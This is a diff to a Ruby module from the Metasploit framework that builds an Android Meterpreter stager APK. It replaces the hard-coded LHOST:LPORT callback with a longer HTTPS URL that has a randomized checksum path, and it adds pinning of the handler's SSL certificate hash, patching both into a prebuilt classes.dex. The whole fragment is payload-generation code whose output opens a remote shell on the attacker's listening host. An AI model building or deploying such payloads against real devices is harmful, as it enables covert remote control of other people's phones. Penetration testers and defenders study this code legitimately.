@@ -27,23 +27,36 @@ module Metasploit3
   end
 
   def generate_jar(opts={})
-    host = datastore['LHOST'] ? datastore['LHOST'].to_s : String.new
-    port = datastore['LPORT'] ? datastore['LPORT'].to_s : 8443.to_s
-    raise ArgumentError, "LHOST can be 32 bytes long at the most" if host.length + port.length + 1 > 32
+    # Default URL length is 30-256 bytes
+    uri_req_len = 30 + rand(256-30)
+    # Generate the short default URL if we don't know available space
+    if self.available_space.nil?
+      uri_req_len = 5
+    end
 
-    jar = Rex::Zip::Jar.new
+    lurl = "ZZZZhttps://#{datastore["LHOST"]}"
+    lurl << ":#{datastore["LPORT"]}" if datastore["LPORT"]
+    lurl << "/"
+    lurl << generate_uri_checksum(Rex::Payloads::Meterpreter::UriChecksum::URI_CHECKSUM_INITJ, uri_req_len)
 
     classes = File.read(File.join(Msf::Config::InstallRoot, 'data', 'android', 'apk', 'classes.dex'), {:mode => 'rb'})
-    string_sub(classes, 'ZZZZ                                ', "ZZZZhttps://" + host + ":" + port)
+    string_sub(classes, 'ZZZZ' + ' ' * 512, lurl)
+
+    verify_cert_hash = get_ssl_cert_hash(datastore['StagerVerifySSLCert'],
+                                         datastore['HandlerSSLCert'])
+    if verify_cert_hash
+        hash = 'WWWW' + verify_cert_hash.unpack("H*").first
+        string_sub(classes, 'WWWW                                        ', hash)
+    end
+
     apply_options(classes)
 
+    jar = Rex::Zip::Jar.new
     jar.add_file("classes.dex", fix_dex_header(classes))
-
     files = [
       [ "AndroidManifest.xml" ],
       [ "resources.arsc" ]
     ]
-
     jar.add_files(files, File.join(Msf::Config.install_root, "data", "android", "apk"))
     jar.build_manifest
 
